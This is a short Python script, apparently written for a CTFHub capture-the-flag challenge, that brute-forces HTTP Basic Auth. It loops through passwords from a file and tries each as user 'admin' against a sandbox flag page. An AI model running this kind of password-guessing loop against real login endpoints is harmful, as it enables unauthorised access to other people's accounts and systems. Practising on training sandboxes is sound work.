def http_basic_auth():
    from requests.auth import HTTPBasicAuth
    from util import http_util
    r = http_util.get('http://www.baidu.com', auth=HTTPBasicAuth('user', 'passwd'))
    # r =http_util.get('http://www.baidu.com', auth=('user', 'passwd'))
    print(r)


def bruce_basi_auth():
    from util import http_util
    with open("data/pass.txt", "r") as ps:
        passwords = ps.readlines()
        for password in passwords:
            password = password.strip()
            r = http_util.get('http://challenge-4eca707b022c9fb1.sandbox.ctfhub.com:10800/flag.html',
                              auth=('admin', password))
            print(password)
            print(r)


if __name__ == "__main__":
    bruce_basi_auth()
